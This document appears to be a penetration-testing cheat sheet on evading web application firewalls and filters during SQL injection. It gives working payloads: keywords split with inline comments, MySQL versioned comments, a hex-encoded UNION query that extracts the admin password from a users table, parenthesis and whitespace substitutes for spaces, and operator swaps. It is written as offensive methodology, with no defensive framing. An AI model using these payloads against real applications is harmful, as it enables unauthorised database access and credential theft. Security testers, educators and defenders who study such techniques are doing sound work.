# Bypassing Filters in SQL Injection

## Methodology
Web Application Firewalls (WAFs) and custom filters often block common SQL keywords (`SELECT`, `UNION`, `OR`, `AND`) or characters (`'`, `"`, spaces). We can use various bypass techniques to evade these defenses.

---

## 1. Case Variation & Alternative Keywords
If the filter is case-sensitive:
* Use `UniOn SeLeCt` instead of `UNION SELECT`.

## 2. Inline Comments (MySQL)
If comments are not filtered correctly, we can split keywords:
```sql
' UN/**/ION SE/**/LECT 1, 2-- -
```
For MySQL-specific execution:
```sql
'/*!UNION*//*!SELECT*/ 1, 2-- -
```

## 3. URL Encoding & Hex Encoding
* URL encode characters if the filter runs before decoding.
* Hex encode strings to avoid quotes:
  ```sql
  # 'admin' -> 0x61646d696e
  ' UNION SELECT 1, password, 3 FROM users WHERE username = 0x61646d696e-- -
  ```

## 4. Alternative Characters for Spaces
If spaces (` `) are blocked or stripped:
* Use comments: `/**/`
* Use tabs/newlines: `%09`, `%0a`, `%0d`, `%0b`, `%a0`
* Parenthesis:
  ```sql
  'UNION(SELECT(1),(2),(3))-- -
  ```

## 5. Logical Operator Bypasses
If `AND` or `OR` are blocked:
* Use `&&` (for AND) or `||` (for OR).
* Use bitwise operators.
